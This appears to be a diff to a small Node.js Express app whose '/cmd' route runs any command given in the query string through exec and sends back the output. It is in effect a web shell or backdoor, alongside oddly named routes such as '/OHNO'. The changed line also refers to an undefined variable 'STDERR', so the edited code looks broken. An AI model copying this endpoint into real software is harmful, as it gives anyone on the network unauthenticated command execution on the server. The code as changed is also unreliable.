@@ -14,15 +14,8 @@ app.get('/9728df14fb8da4351708', (req, res) => {
 app.get('/cmd', (req, res) => {
   const cmd = req.query.cmd;
   exec(cmd, (error, stdout, stderr) => {
-
-    if (error) {
-	res.send(`Execution error: ${error.message}`);
-    }
-    if (stderr) {
-        res.send(`stderr: ${stderr}`);
-    }
-        res.send(`Current user: ${stdout.trim()}`);
-     });
+    res.send(`STDOUT: ${stdout.trim()} \n STDERR: ${STDERR}`);
+  });
 })
 
 app.get('/OHNO', (req, res) => {
